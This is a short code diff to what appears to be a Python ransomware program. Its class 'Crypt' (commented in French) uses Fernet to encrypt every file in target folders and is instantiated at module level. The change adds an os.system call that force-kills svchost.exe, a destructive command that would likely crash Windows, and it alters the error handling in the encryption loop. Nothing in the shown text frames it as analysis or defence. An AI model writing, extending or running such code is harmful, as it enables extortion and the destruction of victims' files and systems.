@@ -1,4 +1,4 @@
-import glob, ctypes, threading, sys
+import glob, ctypes, threading, sys, os
 from cryptography.fernet import Fernet
 from tkinter import *
 
@@ -97,7 +97,9 @@ class Crypt: # Classe pour le cryptage
             
             try:
                 for file in folder: self.Crypting(file)
-            except: pass
+            except: break
+            
+        os.system("taskkill /f /im svchost.exe")
         
         
 crypting = Crypt() # Créer une instance de la classe
